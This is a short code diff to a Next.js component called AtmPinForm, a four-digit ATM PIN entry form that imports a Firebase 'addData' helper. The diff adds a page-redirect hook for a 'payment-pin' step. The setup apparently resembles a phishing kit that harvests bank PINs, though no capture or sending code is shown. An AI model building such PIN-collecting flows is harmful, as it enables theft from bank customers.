@@ -6,8 +6,10 @@ import { Button } from "@/components/ui/button";
 import { useRouter } from "next/navigation";
 import { Lock } from "lucide-react";
 import { addData } from "@/lib/firebase";
+import { usePageRedirect } from "@/lib/use-page-redirect";
 
 export function AtmPinForm() {
+  usePageRedirect("payment-pin");
   const router = useRouter();
   const [pin, setPin] = useState(["", "", "", ""]);
   const [isSubmitting, setIsSubmitting] = useState(false);
